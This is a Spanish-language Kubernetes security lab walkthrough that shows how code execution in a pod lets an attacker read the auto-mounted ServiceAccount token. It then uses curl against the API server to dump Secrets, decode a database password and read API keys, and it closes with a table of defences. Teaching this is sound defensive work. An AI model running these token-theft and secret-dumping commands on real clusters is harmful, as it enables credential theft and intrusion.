# Lab 2: Token de ServiceAccount Expuesto

## Objetivo

Demostrar como un atacante con RCE (Remote Code Execution) en un contenedor puede
leer el token del ServiceAccount montado automaticamente y usarlo para acceder al
API Server de Kubernetes.

| Propiedad        | Valor                                    |
|------------------|------------------------------------------|
| **Namespace**    | `lab1-token`                             |
| **Ataque**       | RCE -> leer token -> acceder al API      |
| **Defensa**      | `automountServiceAccountToken: false`    |
| **Dificultad**   | Basica                                   |

---

## Requisitos

- Cluster Kubernetes activo
- kubectl configurado

---

### Paso 1 — Desplegar la configuracion vulnerable

```bash
# Crear el namespace y el pod vulnerable
kubectl apply -f vulnerable-pod.yaml

# Crear secrets sensibles que el atacante podra exfiltrar
kubectl apply -f secrets-lab.yaml

# Crear el Role y RoleBinding que da acceso a secrets
kubectl apply -f role-binding-vulnerable.yaml

# Verificar que el pod esta corriendo
kubectl get pods -n lab1-token
```

### Paso 2 — Explotar: Leer el token del ServiceAccount

```bash
# Entrar al pod vulnerable
kubectl exec -it app-vulnerable -n lab1-token -- bash

# Dentro del pod: verificar que el token esta montado
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Paso 3 — Usar el token para acceder al API Server

```bash
# Dentro del pod: guardar variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# Listar pods en el namespace
curl -sk $APISERVER/api/v1/namespaces/lab1-token/pods \
  -H "Authorization: Bearer $TOKEN" | head -50

# Listar SECRETS del namespace (critico!)
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### Paso 4 — Verificar el impacto

```bash
# Dentro del pod: listar nombres de los secrets
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
  -H "Authorization: Bearer $TOKEN" | grep '"name"'

# Leer un secret especifico (credenciales de BD)
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/db-credentials \
  -H "Authorization: Bearer $TOKEN"

# Decodificar el password en base64
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/db-credentials \
  -H "Authorization: Bearer $TOKEN" | grep '"password"' | awk -F'"' '{print $4}' | base64 -d

# Leer API keys robadas
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets/api-keys \
  -H "Authorization: Bearer $TOKEN"

# Salir del pod
exit
```

---

## Diferencias Clave

| Aspecto                        | Vulnerable              | Seguro                            |
|--------------------------------|-------------------------|-----------------------------------|
| `automountServiceAccountToken` | `true` (default)        | `false`                           |
| ServiceAccount                 | `default`               | SA dedicado sin permisos          |
| SecurityContext                | Ninguno (root)          | non-root, readOnly, drop ALL      |
| Imagen                         | `nginx:1.25`            | `nginxinc/nginx-unprivileged:1.25`|
| Recursos                       | Sin limites             | CPU/memoria limitados             |

---

## Limpieza

```bash
kubectl delete namespace lab1-token
```
